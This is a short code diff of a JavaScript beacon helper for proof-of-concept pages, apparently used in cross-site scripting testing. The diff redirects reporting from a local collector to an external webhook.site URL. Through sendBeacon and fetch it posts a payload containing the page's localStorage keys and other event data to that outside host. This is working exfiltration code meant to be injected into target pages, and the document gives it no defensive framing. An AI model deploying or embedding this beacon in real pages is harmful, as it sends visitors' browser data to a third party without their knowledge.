@@ -2,7 +2,7 @@
  * Universal callback beacon — include on any PoC page to report events to the collector
  * Usage: beacon('xss', 'reflected-img', {extra: 'data'})
  */
-var COLLECTOR = '/collect.php';
+var WEBHOOK = 'https://webhook.site/3bf3755d-69fc-4f50-a34c-3c28ed2765ef';
 
 function beacon(category, testName, extraData) {
     var payload = {
@@ -14,19 +14,15 @@ function beacon(category, testName, extraData) {
         localStorage_keys: Object.keys(localStorage),
         data: extraData || {}
     };
-    // Primary: fetch
+    // Primary: sendBeacon to webhook.site
+    try { navigator.sendBeacon(WEBHOOK, JSON.stringify(payload)); } catch(e) {}
+    // Backup: fetch
     try {
-        fetch(COLLECTOR + '?cat=' + encodeURIComponent(category) + '&test=' + encodeURIComponent(testName), {
+        fetch(WEBHOOK, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload),
-            mode: 'no-cors'
+            body: JSON.stringify(payload)
         }).catch(function(){});
-    } catch(e) {}
-    // Backup: image beacon
-    try {
-        var img = new Image();
-        img.src = COLLECTOR + '?cat=' + encodeURIComponent(category) + '&test=' + encodeURIComponent(testName) + '&ts=' + Date.now();
     } catch(e) {}
 }
 
